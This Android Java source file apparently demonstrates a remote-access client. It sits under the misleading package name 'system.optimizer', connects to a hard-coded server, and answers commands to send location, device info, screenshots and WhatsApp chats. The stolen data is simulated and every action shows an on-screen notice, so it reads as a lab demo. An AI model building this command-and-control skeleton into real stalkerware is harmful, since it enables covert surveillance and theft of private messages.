package com.system.optimizer;

import android.content.Context;
import android.widget.Toast;
import java.io.*;
import java.net.*;

public class WhatsAppClient {
    private static final String SERVER_IP = "10.0.2.15"; // IP Ubuntu Anda
    private static final int SERVER_PORT = 8080;
    
    private Socket socket;
    private PrintWriter out;
    private BufferedReader in;
    private Context context;
    private boolean isConnected = false;
    
    public WhatsAppClient(Context context) {
        this.context = context;
    }
    
    public void connectToServer() {
        new Thread(() -> {
            try {
                socket = new Socket(SERVER_IP, SERVER_PORT);
                out = new PrintWriter(socket.getOutputStream(), true);
                in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                isConnected = true;
                
                // Send device info
                sendDeviceInfo();
                
                // Start listening for server commands
                startListening();
                
                showToast("Connected to server!");
                
            } catch (IOException e) {
                showToast("Failed to connect to server: " + e.getMessage());
            }
        }).start();
    }
    
    private void startListening() {
        new Thread(() -> {
            try {
                String command;
                while (isConnected && (command = in.readLine()) != null) {
                    processServerCommand(command);
                }
            } catch (IOException e) {
                isConnected = false;
                showToast("Disconnected from server");
            }
        }).start();
    }
    
    private void processServerCommand(String command) {
        if (command.startsWith("SHOW_MESSAGE:")) {
            String message = command.substring(13);
            showToast("💬 Server: " + message);
            
        } else if (command.startsWith("FAKE_CALL:")) {
            String caller = command.substring(10);
            showToast("📞 Incoming call: " + caller);
            
        } else if (command.equals("GET_LOCATION")) {
            // Simulate location
            String location = "LOCATION:Lat:-6.2088,Lng:106.8456 (Jakarta)";
            sendMessage(location);
            showToast("📍 Location sent to server");
            
        } else if (command.equals("GET_DEVICE_INFO")) {
            String info = "DEVICE_INFO:Android " + android.os.Build.VERSION.RELEASE + 
                         ", Model: " + android.os.Build.MODEL +
                         ", Battery: 85%" +
                         ", Storage: 64GB";
            sendMessage(info);
            showToast("📊 Device info sent to server");
            
        } else if (command.equals("CAPTURE_SCREENSHOT")) {
            String screenshot = "SCREENSHOT:Screenshot captured at " + System.currentTimeMillis();
            sendMessage(screenshot);
            showToast("📸 Screenshot sent to server");
            
        } else if (command.equals("GET_WHATSAPP_CHATS")) {
            // Simulate WhatsApp chats
            String whatsappChats = "WHATSAPP_CHATS:\n" +
                    "👤 Mom (2:30 PM): Dinner ready?\n" +
                    "👤 Boss (1:15 PM): Meeting at 3 PM\n" +
                    "👤 John (12:45 PM): Let's hang out tonight\n" +
                    "👤 Sarah (11:20 AM): Did you see my message?\n" +
                    "👤 Group Family (10:05 AM): Happy Birthday!";
            sendMessage(whatsappChats);
            showToast("💬 WhatsApp chats sent to server");
        }
    }
    
    private void sendDeviceInfo() {
        String deviceInfo = "DEVICE_CONNECTED:" + android.os.Build.MODEL;
        sendMessage(deviceInfo);
    }
    
    public void sendMessage(String message) {
        if (out != null && isConnected) {
            out.println(message);
        }
    }
    
    public void disconnect() {
        isConnected = false;
        try {
            if (out != null) out.close();
            if (in != null) in.close();
            if (socket != null) socket.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    
    private void showToast(String message) {
        Toast.makeText(context, message, Toast.LENGTH_LONG).show();
    }
}